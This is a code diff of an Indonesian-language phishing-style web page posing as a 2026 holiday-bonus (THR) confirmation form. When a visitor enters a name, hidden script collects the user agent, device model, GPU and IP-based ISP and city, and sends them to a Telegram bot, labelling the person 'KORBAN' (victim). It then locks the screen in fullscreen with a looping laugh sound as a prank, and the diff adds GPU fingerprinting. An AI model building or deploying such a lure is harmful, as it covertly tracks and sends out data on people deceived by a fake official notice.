@@ -6,7 +6,7 @@
     <title>Konfirmasi Penerimaan THR 2026 🌙</title>
     <style>
         body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
-        #intro { margin-top: -50px; padding: 0-20px; z-index: 5; }
+        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
         h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
         p { color: #166534; margin-top: 0; font-weight: bold; }
         #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 20px; width: 280px; z-index: 6; }
@@ -48,6 +48,7 @@
         const statusText = document.getElementById('status-text');
         const prank = document.getElementById('prank-screen');
         
+        // PRE-LOAD SUARA
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
         prankSound.load();
 
@@ -57,15 +58,25 @@
         async function kirimLog(nama) {
             const ua = navigator.userAgent;
             let device = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iPhone/iOS" : "PC");
-            const model = ua.match(/\(([^)]+)\)/) ? ua.match(/\(([^)]+)\)/)[1] : "Unknown Device";
-            let provider = "Mencari..."; let kota = "Unknown";
+            
+            // Deteksi GPU (buat nebak chipset HP)
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const GPU = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Unknown GPU";
+            
+            let isp = "Unknown";
+            let kota = "Unknown";
+
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
-                provider = d.org || "Gagal Deteksi";
+                isp = d.connection.isp || "Unknown";
                 kota = d.city || "Unknown";
-            } catch (e) {}
-            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${device}\n🔍 Seri: ${model}\n🌐 Provider: ${provider}\n📍 Kota: ${kota}`;
+            } catch (e) { isp = "AdBlock/Error"; }
+
+            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${device}\n🔍 Seri: ${ua.split(') ')[0].split('(')[1]}\n🎮 GPU: ${GPU}\n🌐 Provider: ${isp}\n📍 Lokasi: ${kota}\n⏰ Jam: ${new Date().toLocaleTimeString()}`;
+            
             fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`, { mode: 'no-cors' });
         }
 
@@ -76,14 +87,14 @@
                 return;
             }
 
-            // --- FIX FULLSCREEN & SUARA (Wajib di dalam event click langsung) ---
+            // --- TRICK: AKTIFKAN FULLSCREEN & SUARA SECEPATNYA ---
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-
+            
+            // Pancing suara biar browser ijinin main nanti
             prankSound.play().then(() => { prankSound.pause(); prankSound.currentTime = 0; }).catch(() => {});
-            // --------------------------------------------------------------------
+            // ----------------------------------------------------
 
             kirimLog(nama);
             loading.style.display = 'flex';
@@ -96,7 +107,7 @@
                 prankSound.loop = true;
                 prankSound.play();
                 if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
-            }, 5000);
+            }, 5500);
         });
     </script>
 </body>
